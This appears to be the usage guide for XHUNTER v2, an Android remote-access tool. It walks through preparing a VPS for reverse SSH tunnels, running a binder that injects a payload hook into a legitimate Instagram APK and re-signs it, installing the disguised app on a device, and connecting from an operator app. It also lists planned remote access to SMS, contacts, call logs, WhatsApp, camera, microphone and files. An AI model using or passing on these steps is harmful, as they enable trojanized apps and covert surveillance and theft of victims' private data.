# XHUNTER v2 demo — usage

Setup steps, release assets, and reference tables. For a short project overview see [README.md](README.md). For `config.txt` keys see [binder/BINDER.md](binder/BINDER.md).

**Release:** [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) — operator app [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk), example host [`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/instagram.apk).

## Quick overview: what you do in order

Follow these steps from top to bottom:

| Step | What you do |
|------|-------------|
| **A** | Prepare a VPS: open the right ports, enable SSH settings the app expects, set a user password if you use password-based tunnel login. |
| **B** | On your PC, run the binder: clone the repo, run `setup.sh`, edit `config.txt`, run `binder.sh`, install the merged APK on a test device. |
| **C** | On the operator phone, install `xhunter_v2.0-demo.apk`, enter the same server details, start the tunnel, and wait for the client to appear in the list. |

The sections below walk through **A**, **B**, and **C** in detail.

## Getting started

### What you need before you start

- **Android devices:** one for the operator (host) app, and one where you will install the **merged** test APK
- **Network:** internet access and a **VPS** or cloud VM that you control
- **Computer:** macOS, Linux, or Windows with **Git Bash** or **WSL** (needed for the binder scripts)
- **Java:** a **JDK** on the computer; the binder’s `setup.sh` checks for `java`

---

### Step A — VPS and SSH reverse port forwarding

You need a server that devices can reach, with forwarding set up so a device running the merged app can open a **reverse SSH tunnel**. Use the **same server address** in the Xhunter app and as **`HOST`** in `binder/config.txt` (IP or DNS in `remote_server_ip`).

#### A.1 Create the server and open ports

1. Create an **Ubuntu** (or similar) instance on a VPS provider or **EC2**.
2. In the **security group**, **firewall**, or **ufw**, allow **inbound** traffic at least for:
   - **TCP port 22** — SSH, so you can log in and manage the server
   - **TCP port 8080** — used in this guide as the default listen port for the Xhunter tunnel path. If you change the port in the app, open that port instead. If the client is still set to use **8080**, that port must be open on the server.
3. Restrict **who** can connect if you can (for example your own IP ranges instead of the whole internet). **Outbound** rules on typical cloud images are usually permissive; what matters for this setup is **inbound 22 and 8080** (or your chosen port) so you can SSH in and so sessions can reach the listener.

#### A.2 Log in over SSH

Example (replace the key file and address with yours):

```bash
ssh -i your_key.pem ubuntu@<remote_server_ip>
```

On some Amazon images the default user is **`ec2-user`** instead of **`ubuntu`**.

#### A.3 Password for tunnel login (if you use password-based SSH in the app)

The tunnel flow in this guide assumes the app logs in with a **password**. Set one for the Linux user you will use, for example:

```bash
sudo passwd ubuntu
```

Use the correct username (`ec2-user`, etc.) for your image.

#### A.4 SSH server configuration: `GatewayPorts` and password authentication

**Security note:** allowing password login and `GatewayPorts yes` is convenient for this tutorial; in production you should harden the server and prefer key-based SSH. Apply these changes only on **your own** server.

1. Edit `/etc/ssh/sshd_config` (or a file under `sshd_config.d/`) and set:
   - **`GatewayPorts`** to **`yes`** (change from `no` if needed)
   - If you need password login: **`PasswordAuthentication`** to **`yes`** (change from `no` if needed)
2. Restart the SSH service (use the command that matches your system):

   ```bash
   sudo systemctl restart ssh
   # or:
   sudo systemctl restart sshd
   # or (older style):
   sudo service sshd restart
   ```

3. In **Xhunter** (after you install [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk) from the [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) release), enter **host**, **user**, **password**, and **ports** so they match this server. After the tunnel works, use the same **public IP** (or hostname) as **`HOST`** when you build the merged client with the binder.

**What “reverse” means here:** the device connects **out** to your server; the app is configured so the operator host app can accept the client. Exact ports are shown inside the app.

---

### Step B — Binder: merge the client into a host APK (demo uses Instagram)

1. **Clone** the [xhunter](https://github.com/anirudhmalik/xhunter) repository and open the **`binder`** folder:

   ```bash
   git clone https://github.com/anirudhmalik/xhunter.git
   cd xhunter/binder
   ```

   You should see `setup.sh` and `config.txt`. The operator APK is **not** stored in Git. Download [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk) from [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) and put it in the **repository root** next to `binder/` if you want it beside the project, or install it directly on the phone from the release. If your clone folder has another name, `cd` into that folder before `cd binder`.

2. **First-time setup** (run once):

   ```bash
   chmod +x setup.sh binder.sh
   ./setup.sh
   ```

3. **Edit `config.txt`:** set **`HOST`** to your **VPS public IP** (or DNS name). The sample line **`HOST_APK=apps/instagram.apk`** expects the file at **`binder/apps/instagram.apk`**. Download [`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/instagram.apk) from the same [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) release and save it under `binder/apps/`, or set **`HOST_APK`** to the path of another host APK. Optional keys are described in [binder/BINDER.md](binder/BINDER.md).

4. **Run the binder** in a normal terminal (not piped into another command):

   ```bash
   ./binder.sh
   ```

   <img width="750" height="482" alt="Binder terminal output" src="https://github.com/user-attachments/assets/e8d44b08-e4ac-490a-b386-04541053b5d0" />

5. When you are asked to choose the **hook** activity, pick the line for **`InstagramMainActivity`**. The example below shows index **13**; **your list and numbers may differ**:

   ```text
   Choose activity for Payload.start hook (up to 20 shown; use --hook-list-max to list more. ★ = MAIN/LAUNCHER):
   …
    13)    com.instagram.mainactivity.InstagramMainActivity
   …
   Enter number (1-20) or q: 13
   ```

   <img width="498" height="327" alt="Hook selection prompt" src="https://github.com/user-attachments/assets/c8cee71c-82b7-43f7-836c-78cba9a21206" />

6. Wait until merging, rebuilding, and signing finish.

7. **Output file:** `binder/out/xhunter-merged.apk` (unless you set **`OUT_APK`** in config).

8. Install that APK on your **test** device. The client often connects only **after** the user **opens** the app, **logs in** if the app requires it, and reaches the **main/home** screen.

9. On the **operator** phone, install [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk) from the [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) release, enter your **SSH** settings, **start the tunnel**, and wait for the device to show up in the client list. See **Step C** below for operator-app notes.

---

### Step C — Operator app: install and use `xhunter_v2.0-demo.apk`

1. Download and install [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk) from the [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) release. If the device blocks unknown sources, follow the system prompts or see a guide such as [installing apps from unknown sources on Android](https://www.maketecheasier.com/install-apps-from-unknown-sources-android).
2. On **Android 13 and newer**, allow **notifications** for the tunnel foreground service if the system asks.
3. Open the app and enter **SSH** host, user, password, and **ports** to match your VPS. You can **save** a profile. **Start** the tunnel. When a merged device connects, it appears in the **client list**. In the **demo** build, many modules are labeled **Pro only**; see [Features: demo vs pro](#features-demo-vs-pro).
4. The UI shows a **v2.0 demo** badge, plus **Settings**, **About**, and in-app **legal** text.

## Files in this repository

| Item | Purpose |
|------|---------|
| [README.md](README.md) | Short overview, disclaimer, screenshots |
| [USAGE.md](USAGE.md) | This setup guide |
| `images/logo.png` | Logo in the README |
| [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk) | Operator app — [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) |
| [`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/instagram.apk) | Example host APK — put under `binder/apps/` if you use `HOST_APK=apps/instagram.apk` |
| `binder/` | `setup.sh`, `binder.sh`, `config.txt`, `vendor/`, and related files |
| [binder/BINDER.md](binder/BINDER.md) | Reference for `config.txt` |

If `setup.sh` reports missing files, run **`binder/setup.sh`** again after you add what it expects.

## Features: demo vs pro

| Area | v2.0 **demo** (this distribution) | **Pro** (planned) |
|------|-----------------------------------|-------------------|
| Device list and **device info** / refresh | Yes | Yes |
| **File explorer** | Locked / Pro only in demo | Yes |
| **WhatsApp** archive, **installed apps** | Pro only in demo | Yes |
| **SMS** / **send SMS** | Pro only in demo | Yes |
| **Contacts** / **call log** | Pro only in demo | Yes |
| **Camera** / **mic** / **clipboard** | Pro only in demo | Yes |

The VPS and binder workflow is the same; **pro** refers to what a future **host** build enables remotely.

Older **v1.6-style** all-in-one APK workflows (in-app build and bind) are replaced here by the **desktop binder** plus **SSH** setup above.

## Contributing

Contributions help the open source community learn and improve projects. Suggestions and pull requests are welcome.

1. Fork the project
2. Create a feature branch (`git checkout -b feature/YourFeature`)
3. Commit your changes (`git commit -m 'Add some feature'`)
4. Push to the branch (`git push origin feature/YourFeature`)
5. Open a pull request

You can also open an issue with the tag `enhancement` for ideas.
